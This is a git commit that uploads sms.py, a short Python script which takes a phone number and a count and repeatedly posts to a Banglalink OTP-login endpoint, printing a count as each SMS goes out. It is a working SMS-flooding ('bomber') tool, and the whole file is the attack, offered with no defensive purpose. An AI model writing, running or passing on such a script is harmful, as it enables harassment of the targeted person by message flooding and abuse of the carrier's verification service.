936e17dcb0fa9c8edb9da71d7ea08c7324b4470a
stfomor <84955259+stfomor@users.noreply.github.com>
2021-06-28 18:00:48 +0600

    Add files via upload

---
+++ sms.py
@@ -0,0 +1,15 @@
+import requests
+
+#POST
+
+myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
+
+nam=str(input(" Enter Your Number :"))
+
+number={'mobile':nam}
+
+amount=int(input(" Enter The Amount. : "))
+
+for i in range(amount):
+	requests.post(myblapi,data=number)
+	print(str(i+1)+" SMS Sent")
